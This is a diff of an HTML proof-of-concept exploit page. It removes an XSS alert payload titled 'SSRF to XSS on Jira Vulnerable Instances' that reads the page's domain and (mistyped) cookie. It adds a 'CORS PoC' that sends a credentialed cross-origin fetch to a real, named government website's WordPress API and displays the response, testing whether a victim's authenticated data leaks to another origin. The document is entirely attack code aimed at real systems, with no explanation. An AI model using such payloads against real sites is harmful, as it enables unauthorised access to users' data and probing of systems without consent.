@@ -1,10 +1,21 @@
-<<html>
-<head>
-<title>SSRF to XSS on Jira Vulnerable Instances</title>
-</head>
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>CORS PoC</title></head>
+<body>
+<h3>CORS PoC — open console</h3>
 <script>
-alert( document.domain + " is vulnerable " );
-alert(domain.cookie);
+fetch('https://www.nasa.gov/wp-json/wp/v2/topic/187609', {
+  method: 'GET', mode: 'cors', credentials: 'include'
+})
+.then(r => r.text())
+.then(t => {
+  console.log('POC response length', t.length);
+  document.body.appendChild(document.createElement('pre')).innerText = t.slice(0,1000);
+})
+.catch(e => {
+  console.error('fetch error', e);
+  document.body.appendChild(document.createElement('pre')).innerText = 'fetch error: '+e;
+});
 </script>
 </body>
 </html>
